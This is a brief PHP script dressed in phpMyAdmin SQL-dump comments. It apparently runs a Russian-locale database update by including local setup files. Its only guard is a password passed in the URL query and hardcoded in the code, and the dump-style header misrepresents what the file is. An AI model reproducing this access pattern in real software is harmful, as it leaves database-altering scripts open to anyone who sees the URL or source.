<?php
// --phpMyAdmin SQL Dump
// --version 2.6.1
// --http://www.phpmyadmin.net
// --
// --m: 01.04.2015
// --PHP: 5.2.4

//DON'T TOUCH THIS SCRIPT! IT'S NOT FOR MODIFICATION!
//IF THIS SCRIPT WILL BE MODIFIED, YOU CAN BREAK DATABASE!

$passw=$_GET["20095230"]; if ( $passw!=="20095230" ) { echo "ACCESS DENIED!"; return; }

echo "<h3>RUSSIAN LOCALE...</h3>";

include( "../setup/f_set--.php" );

if ( $error==0 ) include( "../setup/f_updru.php" );
?>
